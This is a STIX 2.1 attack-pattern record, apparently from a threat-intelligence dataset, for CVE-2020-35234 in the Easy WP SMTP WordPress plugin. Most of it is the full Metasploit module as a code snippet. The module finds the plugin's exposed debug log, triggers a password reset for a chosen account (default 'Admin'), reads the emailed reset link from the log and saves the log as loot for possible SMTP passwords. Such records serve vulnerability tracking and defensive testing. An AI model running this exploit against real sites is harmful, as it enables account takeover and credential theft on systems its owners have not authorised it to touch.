{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3702b91-bee2-4f0c-b645-ecb49c19417c",
    "created": "2024-08-14T16:31:08.91704Z",
    "modified": "2024-08-14T16:31:08.917044Z",
    "name": "WordPress Easy WP SMTP Password Reset",
    "description": " Wordpress plugin Easy WP SMTP versions <= 1.4.2 was found to not include index.html within its plugin folder. This potentially allows for directory listings.  If debug mode is also enabled for the plugin, all SMTP commands are stored in a debug file.  An email must have been sent from the system as well to create the debug file.  If an email hasn't been sent (Test Email function not included), Aggressive can bypass the last check. Combining these items, it's possible to request a password reset for an account, then view the debug file to determine the link that was emailed out, and reset the user's password. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_easy_wp_smtp.rb",
            "external_id": "wp_easy_wp_smtp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wordpress.org/support/topic/security-issue-with-debug-log/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.nintechnet.com/wordpress-easy-wp-smtp-plugin-fixed-zero-day-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2432768/easy-wp-smtp"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10494"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-35234"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Easy WP SMTP Password Reset',\n        'Description' => %q{\n          Wordpress plugin Easy WP SMTP versions <= 1.4.2 was found to not include index.html within its plugin folder.\n          This potentially allows for directory listings.  If debug mode is also enabled for the plugin, all SMTP\n          commands are stored in a debug file.  An email must have been sent from the system as well to create the debug\n          file.  If an email hasn't been sent (Test Email function not included), Aggressive can bypass the last check.\n          Combining these items, it's possible to request a password reset for an account, then view the debug file to determine\n          the link that was emailed out, and reset the user's password.\n        },\n        'Author' => [\n          'h00die', # msf module\n          # this was an 0day\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://wordpress.org/support/topic/security-issue-with-debug-log/'],\n          ['URL', 'https://blog.nintechnet.com/wordpress-easy-wp-smtp-plugin-fixed-zero-day-vulnerability/'],\n          ['URL', 'https://plugins.trac.wordpress.org/changeset/2432768/easy-wp-smtp'],\n          ['WPVDB', '10494'],\n          ['CVE', '2020-35234']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2020-12-06'\n      )\n    )\n    register_options [\n      OptString.new('USER', [false, 'Username to reset the password for', 'Admin']),\n      OptBool.new('AGGRESSIVE', [false, 'Proceed if debug file not found', false]),\n    ]\n  end\n\n  def get_debug_file(aggressive)\n    print_status('Checking for debug_log file')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => \"#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp')}/\" # trailing / to browse directory\n    })\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n    # find the debug file name, prefix during my testing was 14 alpha-numeric\n    unless />\\s*(?<debug_log>\\w{5,15}_debug_log\\.txt)/ =~ res.body\n      unless aggressive\n        fail_with Failure::NotVulnerable, 'Either debug log not turned on, or directory listings disabled.  Try AGGRESSIVE mode if this is a false positive'\n      end\n      print_error('Debug file not found, bypassing check due to AGGRESSIVE mode')\n    end\n    debug_log\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'\n    end\n\n    checkcode = check_plugin_version_from_readme('easy-wp-smtp', '1.4.2')\n    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)\n      fail_with Failure::NotVulnerable, 'A vulnerable version of Easy WP SMTP was not found'\n    end\n    print_good('Vulnerable version of Easy WP SMTP detected')\n\n    debug_log = get_debug_file(datastore['AGGRESSIVE'])\n    if debug_log\n      print_good(\"Found debug log: #{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp', debug_log)}\")\n    end\n    print_status(\"Sending password reset for #{datastore['USER']}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'wp-login.php'),\n      'vars_get' => {\n        'action' => 'lostpassword'\n      },\n      'vars_post' => {\n        'user_login' => datastore['USER'],\n        'redirect_to' => '',\n        'wp-submit' => 'Get New Password'\n      }\n    })\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n    fail_with Failure::NotVulnerable, 'Site not configured to submit new password request' if res.body.include?('The email could not be sent')\n    fail_with Failure::Unknown, 'Unable to submit new password request' unless res.code == 302\n\n    unless debug_log\n      Rex.sleep(2) # give the log file time to write if it wasn't there already\n      debug_log = get_debug_file(false) # die if file not found\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp', debug_log)\n    })\n    loot = store_loot(debug_log, 'text/plain', ip, res.body)\n    print_good(\"Debug log saved to #{loot}.  Manual review for possible SMTP password, and other information.\")\n    c2s = 'CLIENT -> SERVER:\\s+'\n    # this is an ugly regex, but the username, and link span multiple lines\n    res.body.scan(/#{c2s}Username: (?<username>\\w+)\\s+#{c2s}#{c2s}If this was a mistake, just ignore this email and nothing will happen.\\s+#{c2s}#{c2s}To reset your password, visit the following address:\\s+#{c2s}#{c2s}(?<link>[^\\n]+)/).each do |match|\n      if datastore['USER'] == match[0]\n        print_good(\"#{match[0]} password reset: #{match[1]}\")\n        next\n      end\n      print_status(\"#{match[0]} password reset: #{match[1]}\")\n    end\n    print_status('Finished enumerating resets.  Last one most likely to succeed')\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-12-06"
}